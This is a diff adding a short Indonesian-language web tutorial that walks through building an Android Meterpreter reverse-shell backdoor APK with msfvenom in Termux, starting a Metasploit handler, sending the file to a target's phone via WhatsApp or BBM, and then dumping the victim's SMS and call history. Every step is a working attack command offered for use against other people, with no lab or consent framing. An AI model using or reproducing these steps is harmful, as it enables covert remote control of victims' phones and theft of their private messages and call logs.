@@ -1,0 +1,7 @@
+<ul><li>Download termux via google playstore, jika sudah di instal silahkan buka kemudian ketik <i>ifconfig </i>guna melihat alamat ip anda sendiri.</li></ul>
+<ul><li>Selanjutnya ketikan <i>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.166 LPORT=4444 R >hack.apk<br/></i>– LHOST ganti dengan alamat ip anda</li></ul>
+<ul><li>Setelah file backdoor sudah jadi, silahkan anda cek atau cari dalam FILE >HOME >hack.apk</li></ul>
+<ul><li>Berikutnya anda buka lagi termux dan ketikan perintah di bawah dan pastikan datanya sama seperti file backdoor.<br/><i>msfconsole</i><br/><i>use exploit/multi/handler</i><br/><i>set payload android/meterpreter/reverse_tcp</i><br/><i>set lhost 192.168.43.166</i><br/><i>set lport 4444</i><br/><i>exploit</i></li></ul>
+<ul><li>Selanjutnya tinggal mengirimkan file hack.apk atau backdor tersebut ke ponsel target hack, kamu bisa kirim via wa, bbm atau yang lainya.</li></ul>
+<ul><li>Jika target berhasil menginstal apk tersebut, maka akan anda lihat meterpreternya.<br/>ketik dump_sms untuk melihat riwayat pesan<br/>ketik dump_calllog untuk melihat histori panggilan</li></ul>
+<ul><li>Selesai.</li></ul><br/>
